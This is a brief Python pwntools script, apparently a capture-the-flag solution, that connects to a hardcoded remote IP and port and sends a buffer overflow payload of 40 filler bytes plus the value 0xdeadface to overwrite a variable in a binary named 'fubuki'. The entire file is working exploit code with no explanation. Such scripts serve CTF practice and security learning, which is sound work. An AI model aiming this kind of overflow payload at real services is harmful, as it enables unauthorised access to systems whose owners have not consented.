from pwn import *

# elf = context.binary = ELF('./fubuki')
# p = process('./fubuki-static')
p = remote('103.176.79.36', 13370)

payload = b'A' * 40
payload += p32(0xdeadface)

p.sendlineafter(b':', payload)
print(p.recvuntil(b'!').decode())
